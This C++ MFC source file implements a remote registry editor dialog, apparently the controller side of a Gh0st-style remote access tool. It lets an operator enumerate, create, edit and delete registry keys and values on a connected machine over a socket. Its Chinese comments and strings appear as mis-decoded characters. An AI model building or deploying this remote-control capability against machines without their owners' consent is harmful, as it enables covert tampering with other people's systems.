// RegeditDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "RegeditDlg.h"
#include "InputDlg.h"
#include "RegeditTextDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CRegeditDlg dialog
LPCTSTR CRegeditDlg::m_strComputer = TEXT("�ҵĵ���");
LPCTSTR CRegeditDlg::m_strDefault  = TEXT("Ԥ����Ӽ���������㿴�������������˵���������г����ˣ�");

static UINT indicators[] =
{
	ID_SEPARATOR
};

CRegeditDlg::CRegeditDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CRegeditDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CRegeditDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;

	isEnable = true;
	nFlag    = 0;
	isEdit = false; 

	// ���ô���ͼ��
	m_hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON_REGEDIT), IMAGE_ICON, 20, 20, 0);

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

}


void CRegeditDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CRegeditDlg)
	DDX_Control(pDX, IDC_LIST, m_list);
	DDX_Control(pDX, IDC_TREE, m_tree);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CRegeditDlg, CDialog)
	//{{AFX_MSG_MAP(CRegeditDlg)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_TREE, OnRclickTree)
	ON_NOTIFY(TVN_ITEMEXPANDING, IDC_TREE, OnItemexpandingTree)
	ON_NOTIFY(TVN_SELCHANGED, IDC_TREE, OnSelchangedTree)
	ON_COMMAND(ID_MENUITEM_TREE_NEW, OnMenuitemTreeNew)
	ON_COMMAND(ID_MENUITEM_TREE_DEL, OnMenuitemTreeDel)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST, OnDblclkList)
	ON_COMMAND(ID_MENUITEM_REG_EDIT, OnMenuitemRegEdit)
	ON_COMMAND(ID_MENUITEM_REG_STR, OnMenuitemRegStr)
	ON_COMMAND(ID_MENUITEM_REG_DWORD, OnMenuitemRegDword)
	ON_COMMAND(ID_MENUITEM_EXSTR, OnMenuitemExstr)
	ON_NOTIFY(NM_RCLICK, IDC_LIST, OnRclickList)
	ON_COMMAND(ID_MENUITEM_REG_DEL, OnMenuitemRegDel)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CRegeditDlg message handlers

void CRegeditDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if(m_list.m_hWnd==NULL)return;
	if(m_tree.m_hWnd==NULL)return;


	CRect rect;
	GetDlgItem(IDC_TREE)->GetWindowRect(&rect);

	CRect treeRec,listRec;
    treeRec.top=treeRec.left=0;
	treeRec.right=rect.Width();
	treeRec.bottom=cy-20;
    m_tree.MoveWindow(treeRec);

	listRec.top=0;
	listRec.left =treeRec.right+3;
	listRec.right=cx;
	listRec.bottom=cy-20;
	m_list.MoveWindow(listRec);

	if(m_wndStatusBar.m_hWnd!=NULL)
	{
		CRect rc;
		rc.top=cy-20;
		rc.left=0;
		rc.right=cx;
		rc.bottom=cy;
		m_wndStatusBar.MoveWindow(rc);
	}
}

void CRegeditDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);

	CDialog::OnClose();
}

BOOL CRegeditDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	// TODO: Add extra initialization here
	// ���ñ���
	CString str;
	str.Format("Զ��ע��� \\\\%s", m_IPAddress);
	SetWindowText(str);	

	// ����״̬��
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return FALSE;      // fail to create
	}
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ״̬��		

	// ����list
	m_list.ModifyStyle(0, LVS_REPORT);
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	HICON listicon[2];
	listicon[0]=AfxGetApp()->LoadIcon(IDI_ICON_REZ_5);
	listicon[1]=AfxGetApp()->LoadIcon(IDI_ICON_REZ_6);
	m_ImageList.Create(16,16,ILC_COLOR4|ILC_MASK,2,2); //16,16Ϊͼ��ֱ��ʣ�2,2Ϊ��list��������ɵ�ͼ����
	for(int i=0 ; i<2 ; ++i)
		m_ImageList.Add(listicon[i]); //����ͼ��
	m_list.SetImageList(&m_ImageList,LVSIL_SMALL);
	m_list.InsertColumn(0,TEXT("����"),LVCFMT_LEFT,180);
	m_list.InsertColumn(1,TEXT("����"),LVCFMT_LEFT,150);
	m_list.InsertColumn(2,TEXT("����"),LVCFMT_LEFT,350);


	// ����
	HICON treeicon[4];
	treeicon[0]=AfxGetApp()->LoadIcon(IDI_ICON_REZ_1);
	treeicon[1]=AfxGetApp()->LoadIcon(IDI_ICON_REZ_2);
	treeicon[2]=AfxGetApp()->LoadIcon(IDI_ICON_REZ_3);
	treeicon[3]=AfxGetApp()->LoadIcon(IDI_ICON_REZ_4);

	m_ImageTree.Create(16,16,ILC_COLOR4|ILC_MASK,4,4); //16,16Ϊͼ��ֱ��ʣ�4,4Ϊ��list��������ɵ�ͼ����
	for(int n=0 ; n<4 ; ++n)
		m_ImageTree.Add(treeicon[n]); //����ͼ��
	m_tree.SetImageList(&m_ImageTree,TVSIL_NORMAL);

	m_hRoot = m_tree.InsertItem(m_strComputer,0,1);

	HTREEITEM HKCR=m_tree.InsertItem("HKEY_CLASSES_ROOT",2,3,m_hRoot);
	m_tree.InsertItem(m_strDefault,2,3,HKCR);//Ϊ���������Ч��,������һ����

	HTREEITEM HKCU=m_tree.InsertItem("HKEY_CURRENT_USER",2,3,m_hRoot);
	m_tree.InsertItem(m_strDefault,2,3,HKCU);//Ϊ���������Ч��,������һ����

	HTREEITEM HKLM=m_tree.InsertItem("HKEY_LOCAL_MACHINE",2,3,m_hRoot);
	m_tree.InsertItem(m_strDefault,2,3,HKLM);//Ϊ���������Ч��,������һ����

	HTREEITEM HKUS=m_tree.InsertItem("HKEY_USERS",2,3,m_hRoot);
	m_tree.InsertItem(m_strDefault,2,3,HKUS);//Ϊ���������Ч��,������һ����

	HTREEITEM HKCC=m_tree.InsertItem("HKEY_CURRENT_CONFIG",2,3,m_hRoot);
	m_tree.InsertItem(m_strDefault,2,3,HKCC);//Ϊ���������Ч��,������һ����

	m_tree.Expand(m_hRoot,TVE_EXPAND);	


	HWND hWndHeader = m_list.GetDlgItem(0)->GetSafeHwnd();
	m_heades.SubclassWindow(hWndHeader);
	
	m_heades.SetTheme(new CXTHeaderCtrlThemeOfficeXP());
	

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CRegeditDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_REG_INFO:
		AddToTree((char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)));
		break;
	case TOKEN_REG_KEY:
		AddToList((char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)));
		break;
	case TOKEN_REG_ERROR:
		isEdit=false;
		break;
	case TOKEN_REG_SUCCEED:
		ShowSucceed();
		isEdit=false;
		break;
	default:
		break;
	}
	EnableCursor(true);
}

DWORD atod(char *ch)
{
	int len=strlen(ch);
	DWORD d=0;
	for(int i=0;i<len;i++){
		int t=ch[i]-48;   //��λ�ϵ�����
		if(ch[i]>57||ch[i]<48){          //��������
			return d;
		}
		d*=10;
		d+=t;
	}
	return d;
}
void CRegeditDlg::ShowSucceed()
{
	switch(nFlag)
	{
	case 1:
		while(m_tree.GetChildItem(SelectNode)!=NULL)
		{
			m_tree.DeleteItem(m_tree.GetChildItem(SelectNode));        //ɾ�� ����� OnSelchangingTree�¼� ***
		}
		m_tree.DeleteItem(SelectNode);
		break;
	case 2:
		m_tree.InsertItem(strPath,2,3,SelectNode,0);//�����Ӽ�����
		m_tree.Expand(SelectNode,TVE_EXPAND);
		strPath="";
		break;
	case 3:
		m_list.DeleteItem(index);
		index=0;
		break;
	case 4:
		{
			
			int nitem;
			DWORD d;
			char ValueDate[256];
			CString value;
			ZeroMemory(ValueDate,256);
			switch(type)
			{
			case MREG_SZ:   //�����ִ�   
				nitem=m_list.InsertItem(0,Key,0);
				m_list.SetItemText(nitem,1,"REG_SZ");	
				m_list.SetItemText(nitem,2,Value);
				break;
			case MREG_DWORD:  //����DWORD
				d=atod(Value.GetBuffer(0));
				value.Format("0x%x",d);
				sprintf(ValueDate,"  (%wd)",d);
				value+=" ";
				value+=ValueDate;
				nitem=m_list.InsertItem(0,Key,1);
				m_list.SetItemText(nitem,1,"REG_DWORD");	
				m_list.SetItemText(nitem,2,value);
				break;
			case MREG_EXPAND_SZ:
				nitem=m_list.InsertItem(0,Key,0);
				m_list.SetItemText(nitem,1,"REG_EXPAND_SZ");	
				m_list.SetItemText(nitem,2,Value);
				break;
				
			default:
				break;
			}
			
		}
		break;
	case 5:
		{
			DWORD d;
			char ValueDate[256];
			CString value;
			ZeroMemory(ValueDate,256);
			switch(type){
			case MREG_SZ:   //�����ִ�   
				
				m_list.SetItemText(index,2,Value);
				break;
			case MREG_DWORD:  //����DWORD
				d=atod(Value.GetBuffer(0));
				value.Format("0x%x",d);
				sprintf(ValueDate,"  (%wd)",d);
				value+=" ";
				value+=ValueDate;
				m_list.SetItemText(index,2,value);
				break;
			case MREG_EXPAND_SZ:
				m_list.SetItemText(index,2,Value);
				break;
			default:
				break;
			}
		}
		break;
	default:
		break;
	}
	nFlag=0;
}

struct REGMSG
{
	int count;         //���ָ���
	DWORD size;        //���ִ�С
	DWORD valsize;     //ֵ��С	
};
void CRegeditDlg::AddToList(char *lpBuffer)
{
	m_list.DeleteAllItems();
	
	if(lpBuffer==NULL) 
		return;

    REGMSG msg;
	memcpy((void*)&msg,lpBuffer,sizeof(msg));
	char* tmp=lpBuffer+sizeof(msg);
	for(int i=0;i<msg.count;i++)
	{
		BYTE Type=tmp[0];   //ȡ����־ͷ
		tmp+=sizeof(BYTE);
		char* szValueName=tmp;   //ȡ������
		tmp+=msg.size;
		BYTE* szValueDate=(BYTE*)tmp;      //ȡ��ֵ
		tmp+=msg.valsize;
		if(Type==MREG_SZ)
		{
			if (strlen(szValueName) == 0)
			{
				szValueName = "Ĭ��";
			}
			int nitem=m_list.InsertItem(0,szValueName,0);
			m_list.SetItemText(nitem,1,"REG_SZ");	
			m_list.SetItemText(nitem,2,(char*)szValueDate);
		}
		if(Type==MREG_DWORD)
		{
			char ValueDate[256];
			DWORD d=(DWORD)szValueDate;
			memcpy((void*)&d,szValueDate,sizeof(DWORD));
			CString value;
			value.Format("0x%x",d);
			sprintf(ValueDate,"  (%wd)",d);
			value+=" ";
			value+=ValueDate;
			int nitem=m_list.InsertItem(0,szValueName,1);
			m_list.SetItemText(nitem,1,"REG_DWORD");	
			m_list.SetItemText(nitem,2,value);
			
		}
		if(Type==MREG_BINARY)
		{
			char ValueDate[256];
			sprintf(ValueDate,"%wd",szValueDate);
			
			int nitem=m_list.InsertItem(0,szValueName,1);
			m_list.SetItemText(nitem,1,"REG_BINARY");	
			m_list.SetItemText(nitem,2,ValueDate);
		}
		if(Type==MREG_EXPAND_SZ)
		{
			int nitem=m_list.InsertItem(0,szValueName,0);
			m_list.SetItemText(nitem,1,"REG_EXPAND_SZ");	
			m_list.SetItemText(nitem,2,(char*)szValueDate);
		}
	}
}


void CRegeditDlg::AddToTree(char *lpBuffer)
{
	if(lpBuffer==NULL) 
		return;
	int msgsize=sizeof(REGMSG);
	REGMSG msg;
	memcpy((void*)&msg,lpBuffer,msgsize);
	DWORD size =msg.size;
	int count=msg.count;
	

	if(size>0&&count>0)
	{             
		for(int i=0;i<count;i++)
		{
			BOOL bRet = FALSE;
			memcpy(&bRet,lpBuffer+size*i+msgsize , sizeof(BOOL));


			char* szKeyName=lpBuffer+size*i+msgsize + sizeof(BOOL);

			HTREEITEM hItemChild = m_tree.InsertItem(szKeyName,2,3,SelectNode,0);//�����Ӽ�����
			m_tree.Expand(SelectNode,TVE_EXPAND);
			if(bRet)
			{
				m_tree.InsertItem(m_strDefault,2,3,hItemChild);//����ֵ����Ҫ
				TRACE("YES");
			}else
				TRACE("NO");
		}
	}
}


void CRegeditDlg::OnRclickTree(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if(!isEnable)	return;

    CPoint	point;
	GetCursorPos(&point);
    m_tree.ScreenToClient(&point); 
	UINT uFlags;
	HTREEITEM hItem = m_tree.HitTest(point, &uFlags);
	
    if ((hItem != NULL) && (TVHT_ONITEM & uFlags))
	{
		if(hItem== m_hRoot)
		{
			return;
		}
		
		SelectNode=hItem;
		m_tree.Select(hItem, TVGN_CARET);
		CMenu	popup;
		popup.LoadMenu(IDR_MENU_REGEDIT_TREE);	
		CMenu*	pM = popup.GetSubMenu(0);
		CPoint	p;
		GetCursorPos(&p);
		
		pM->TrackPopupMenu(TPM_LEFTALIGN,p.x,p.y,this);
    }

	*pResult = 0;
}

void CRegeditDlg::GetRegTree(NM_TREEVIEW* pNMTreeView)
{
	if(!isEnable) return;
	TVITEM item = pNMTreeView->itemNew;
	if(item.hItem == m_hRoot)
	{
		TRACE("��Ŀ¼ ��չ��");
		return;
	}
    SelectNode=item.hItem;			//�����û��򿪵������ڵ���
	
	// list����
    m_list.DeleteAllItems();
	
	CString FullPath=GetFullPath(SelectNode);
    //m_wndStatusBar.SetPaneText(0,FullPath);
	
	// ɾ���ڵ��µ�����
	while(m_tree.GetChildItem(item.hItem)!=NULL)
	{
		m_tree.DeleteItem(m_tree.GetChildItem(item.hItem));        //ɾ�� ����� OnSelchangingTree�¼� ***
	}
	
	BYTE bToken=GetFatherPath(FullPath);
	
	// ��һ��Ĭ�ϼ�
	int nitem=m_list.InsertItem(0,"(Ĭ��)",0);
	m_list.SetItemText(nitem,1,"REG_SZ");	
	m_list.SetItemText(nitem,2,"(��ֵδ����)");
	
	FullPath.Insert(0,bToken);//����  �Ǹ�����
	bToken=COMMAND_REG_ENUM;
    FullPath.Insert(0,bToken);      //�����ѯ����
	EnableCursor(false);
	
	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), FullPath.GetLength()+1);
}


CString CRegeditDlg::GetFullPath(HTREEITEM hCurrent)
{
	CString strTemp;
	CString strReturn = "";
	while(1)
	{
		if(hCurrent==m_hRoot) return strReturn;
        strTemp = m_tree.GetItemText(hCurrent);   //�õ���ǰ��
		if(strTemp.Right(1) != "\\")
			strTemp += "\\";
		strReturn = strTemp  + strReturn;
		hCurrent = m_tree.GetParentItem(hCurrent);   //�õ�����
		
	}
	return strReturn;
}

BYTE CRegeditDlg::GetFatherPath(CString &FullPath)
{
	BYTE bToken;
	if(!FullPath.Find("HKEY_CLASSES_ROOT"))	//�ж�����
	{
		//MKEY=HKEY_CLASSES_ROOT;
		bToken=MHKEY_CLASSES_ROOT;
		FullPath.Delete(0,sizeof("HKEY_CLASSES_ROOT"));
	}else if(!FullPath.Find("HKEY_CURRENT_USER"))
	{
		bToken=MHKEY_CURRENT_USER;
		FullPath.Delete(0,sizeof("HKEY_CURRENT_USER"));
		
	}else if(!FullPath.Find("HKEY_LOCAL_MACHINE"))
	{
		bToken=MHKEY_LOCAL_MACHINE;
		FullPath.Delete(0,sizeof("HKEY_LOCAL_MACHINE"));
		
	}else if(!FullPath.Find("HKEY_USERS"))
	{
		bToken=MHKEY_USERS;
		FullPath.Delete(0,sizeof("HKEY_USERS"));
		
	}else if(!FullPath.Find("HKEY_CURRENT_CONFIG"))
	{
		bToken=MHKEY_CURRENT_CONFIG;
		FullPath.Delete(0,sizeof("HKEY_CURRENT_CONFIG"));
	}
	return bToken;
}


void CRegeditDlg::OnItemexpandingTree(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here

	if (pNMTreeView->action == TVE_COLLAPSE)
	{
		return;
	}

	GetRegTree(pNMTreeView);
	
	*pResult = 0;
}

void CRegeditDlg::EnableCursor(bool bEnable)
{
	if(bEnable)
	{
		isEnable=true;
		::SetCursor(::LoadCursor(NULL,IDC_ARROW));
	}else
	{
		isEnable=false;
		::SetCursor(LoadCursor(NULL, IDC_WAIT));
	}
}

void CRegeditDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

void CRegeditDlg::OnSelchangedTree(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	GetRegTree(pNMTreeView);

	*pResult = 0;
}

void CRegeditDlg::OnMenuitemTreeNew() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init("�½��Ӽ�", _T("������Ҫ�������Ӽ�����:"), this);
	if (dlg.DoModal() != IDOK)   
		return;

	CString FullPath=GetFullPath(SelectNode);      //�õ�ȫ·��
	FullPath+=dlg.m_str;
	BYTE bToken=GetFatherPath(FullPath);

	FullPath.Insert(0,bToken);//����  �Ǹ�����
	bToken=COMMAND_REG_CREATEKEY;
	FullPath.Insert(0,bToken);      //�����ѯ����

	nFlag = 2 ;
	strPath=dlg.m_str;

	EnableCursor(false);

	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), FullPath.GetLength()+1);
}

void CRegeditDlg::OnMenuitemTreeDel() 
{
	// TODO: Add your command handler code here
	CString FullPath=GetFullPath(SelectNode);      //�õ�ȫ·��

	
 	if (MessageBox("ȷ��ɾ��  " + FullPath   +"����", "��ʾ", MB_YESNO | MB_ICONQUESTION) == IDNO)
	 		return;
	BYTE bToken=GetFatherPath(FullPath);

    FullPath.Insert(0,bToken);//����  �Ǹ�����
	bToken=COMMAND_REG_DELKEY;
    FullPath.Insert(0,bToken);      //�����ѯ����
    nFlag=1;

	EnableCursor(false);

	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), FullPath.GetLength()+1);
}


BYTE CRegeditDlg::GetEditType(int index)
{
	if(index < 0) return 100;
    CString strType=m_list.GetItemText(index,1);      //�õ�����
    if(strType=="REG_SZ") 
		return  MREG_SZ;
	else if(strType=="REG_DWORD")
		return MREG_DWORD;
	else if(strType=="REG_EXPAND_SZ")
		return MREG_EXPAND_SZ;
	else 
		return 100;
}

// ˫��list
void CRegeditDlg::OnDblclkList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here

	OnMenuitemRegEdit();
		
	*pResult = 0;
}

void CRegeditDlg::OnMenuitemRegEdit() 
{
	// TODO: Add your command handler code here
	int index=m_list.GetSelectionMark();
	if(index<0)return;
	BYTE bType=GetEditType(index);
	
	switch(bType)
	{
	   case MREG_SZ:
		   isEdit=true;        //��Ϊ�ɱ༭״̬
		   Key=m_list.GetItemText(index,0);      //�õ���
		   Value=m_list.GetItemText(index,2);      //�õ�ֵ
		   OnMenuitemRegStr();
		   nFlag=5;
		   this->index=index;
		   break;
	   case MREG_DWORD:
		   Key=m_list.GetItemText(index,0);      //�õ���
		   Value.Format("%s",m_list.GetItemText(index,2));      //�õ�ֵ
		   Value.Delete(0,Value.Find('(')+1);        // ȥ������
		   Value.Delete(Value.GetLength()-1);      //
		   isEdit=true;             //��Ϊ�ɱ༭״̬
		   OnMenuitemRegDword();
		   nFlag=5;
		   this->index=index;
		   break;
	   case MREG_EXPAND_SZ:
		   isEdit=true;        //��Ϊ�ɱ༭״̬
		   Key=m_list.GetItemText(index,0);      //�õ���
		   Value=m_list.GetItemText(index,2);      //�õ�ֵ
		   OnMenuitemExstr();
		   nFlag=5;
		   this->index=index;
		   break;
       default:
		   break;
		   
	}
}

void CRegeditDlg::OnMenuitemRegStr() 
{
	// TODO: Add your command handler code here
	CRegeditTextDlg dlg(this);
	if(isEdit)
	{                //�Ǳ༭
		dlg.m_strName=Key;
		dlg.m_strValue=Value;   
		dlg.EPath=true;
	}

	dlg.DoModal();
	if(dlg.isOK)
	{
		CString FullPath=GetFullPath(SelectNode);      //�õ�ȫ·��
		char bToken=GetFatherPath(FullPath);
		DWORD size=1+1+1+sizeof(REGMSG)+FullPath.GetLength()+dlg.m_strName.GetLength()+dlg.m_strValue.GetLength()+6;
		char* buf=new char[size];
 		ZeroMemory(buf,size);
        
		REGMSG msg;
		msg.count=FullPath.GetLength();            //���С
		msg.size=dlg.m_strName.GetLength();          //����С
		msg.valsize=dlg.m_strValue.GetLength();        //���ݴ�С
		
		buf[0]= COMMAND_REG_CREATKEY;               //����ͷ
		buf[1]=MREG_SZ;                           //ֵ����
		buf[2]=bToken;                           //����
		memcpy(buf+3,(void*)&msg,sizeof(msg));                     //����ͷ
		char* tmp=buf+3+sizeof(msg);
		if(msg.count>0)
			memcpy(tmp,FullPath.GetBuffer(0),msg.count);        //��  
		tmp+=msg.count;
		memcpy(tmp,dlg.m_strName.GetBuffer(0),msg.size);          //����
		tmp+=msg.size;
		memcpy(tmp,dlg.m_strValue.GetBuffer(0),msg.valsize);          //ֵ
		tmp=buf+3+sizeof(msg);
		
		// �ƺ�
		type=MREG_SZ;
		nFlag=4;
		Key=dlg.m_strName;
		Value=dlg.m_strValue;
		//
		m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size, TRUE);
		delete[] buf;
	}
}

void CRegeditDlg::OnMenuitemRegDword() 
{
	// TODO: Add your command handler code here
	CRegeditTextDlg dlg(this);
	dlg.isDWORD=true;
	if(isEdit)
	{                //�Ǳ༭
		dlg.m_strName=Key;
		dlg.m_strValue=Value;   
		dlg.EPath=true;
		
	}
	dlg.DoModal();
	if(dlg.isOK)
	{
		CString FullPath=GetFullPath(SelectNode);      //�õ�ȫ·��
		char bToken=GetFatherPath(FullPath);
		DWORD size=1+1+1+sizeof(REGMSG)+FullPath.GetLength()+dlg.m_strName.GetLength()+dlg.m_strValue.GetLength()+6;
		char* buf=new char[size];
		ZeroMemory(buf,size);
        
		REGMSG msg;
		msg.count=FullPath.GetLength();            //���С
		msg.size=dlg.m_strName.GetLength();          //����С
		msg.valsize=dlg.m_strValue.GetLength();        //���ݴ�С
		
		buf[0]= COMMAND_REG_CREATKEY;               //����ͷ
		buf[1]=MREG_DWORD;                           //ֵ����
		buf[2]=bToken;                           //����
		memcpy(buf+3,(void*)&msg,sizeof(msg));                     //����ͷ
		char* tmp=buf+3+sizeof(msg);
		if(msg.count>0)
			memcpy(tmp,FullPath.GetBuffer(0),msg.count);        //��  
		tmp+=msg.count;
		memcpy(tmp,dlg.m_strName.GetBuffer(0),msg.size);          //����
		tmp+=msg.size;
		memcpy(tmp,dlg.m_strValue.GetBuffer(0),msg.valsize);          //ֵ
		tmp=buf+3+sizeof(msg);
		
		// �ƺ�
		type=MREG_DWORD;
		nFlag=4;
		Key=dlg.m_strName;
		Value=dlg.m_strValue;
		//
		m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size, TRUE);
		delete[] buf;
		//LocalFree(buf);
	}
}

void CRegeditDlg::OnMenuitemExstr() 
{
	// TODO: Add your command handler code here
	CRegeditTextDlg dlg(this);
    if(isEdit){                //�Ǳ༭
		dlg.m_strName=Key;
		dlg.m_strValue=Value;   
		dlg.EPath=true;
		
	}
	dlg.DoModal();
	if(dlg.isOK)
	{
		CString FullPath=GetFullPath(SelectNode);      //�õ�ȫ·��
		char bToken=GetFatherPath(FullPath);
		DWORD size=1+1+1+sizeof(REGMSG)+FullPath.GetLength()+dlg.m_strName.GetLength()+dlg.m_strValue.GetLength()+6;
		char* buf=new char[size];
		ZeroMemory(buf,size);
        
		REGMSG msg;
		msg.count=FullPath.GetLength();            //���С
		msg.size=dlg.m_strName.GetLength();          //����С
		msg.valsize=dlg.m_strValue.GetLength();        //���ݴ�С
		
		buf[0]= COMMAND_REG_CREATKEY;               //����ͷ
		buf[1]=MREG_EXPAND_SZ;                           //ֵ����
		buf[2]=bToken;                           //����
		memcpy(buf+3,(void*)&msg,sizeof(msg));                     //����ͷ
		char* tmp=buf+3+sizeof(msg);
		if(msg.count>0)
			memcpy(tmp,FullPath.GetBuffer(0),msg.count);        //��  
		tmp+=msg.count;
		memcpy(tmp,dlg.m_strName.GetBuffer(0),msg.size);          //����
		tmp+=msg.size;
		memcpy(tmp,dlg.m_strValue.GetBuffer(0),msg.valsize);          //ֵ
		tmp=buf+3+sizeof(msg);
		
		// �ƺ�
		type=MREG_EXPAND_SZ;
		nFlag=4;
		Key=dlg.m_strName;
		Value=dlg.m_strValue;
		//
		m_iocpServer->Send(m_pContext, (LPBYTE)(buf), size, TRUE);
		delete[] buf;
	}
}

void CRegeditDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if(!isEnable) 
		return;
	if( SelectNode== m_hRoot)
	{
		return;
	}
	
    CMenu	popup;
	popup.LoadMenu(IDR_MENU_REGEDIT_LIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	
	if (m_list.GetSelectedCount() == 0)             //û��ѡ��
	{
		pM->EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //�༭
		pM->EnableMenuItem(1, MF_BYPOSITION | MF_GRAYED);     //ɾ��
	}else{
		if(GetEditType(m_list.GetSelectionMark())==100)
			pM->EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //�༭
		pM->EnableMenuItem(2, MF_BYPOSITION | MF_GRAYED);         //�½�
		
	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
 //  CXTPCommandBars::TrackPopupMenu(pM,TPM_RIGHTBUTTON,p.x,p.y,this);
	*pResult = 0;
}

void CRegeditDlg::OnMenuitemRegDel() 
{
	// TODO: Add your command handler code here
	REGMSG msg;
	
	int index=m_list.GetSelectionMark();
	
	CString FullPath=GetFullPath(SelectNode);      //�õ�ȫ·��
	char bToken=GetFatherPath(FullPath);
	
	CString key=m_list.GetItemText(index,0);      //�õ�����
    
	msg.size=FullPath.GetLength();              //  ������С
	msg.valsize=key.GetLength();               //������С
    
	int datasize=sizeof(msg)+msg.size+msg.valsize+4;
	char *buf=new char[datasize];
	ZeroMemory(buf,datasize);
	
    buf[0]=COMMAND_REG_DELVAL;     //����ͷ
	buf[1]=bToken;              //����
	memcpy(buf+2,(void*)&msg,sizeof(msg));                     //����ͷ
	if(msg.size>0)        //���� �Ͳ���д����
		memcpy(buf+2+sizeof(msg),FullPath.GetBuffer(0),FullPath.GetLength());  //��ֵ
	memcpy(buf+2+sizeof(msg)+FullPath.GetLength(),key.GetBuffer(0),key.GetLength());  //��ֵ
	nFlag=3;
	this->index=index;
    m_iocpServer->Send(m_pContext, (LPBYTE)(buf), datasize, TRUE);
	delete[] buf;

}
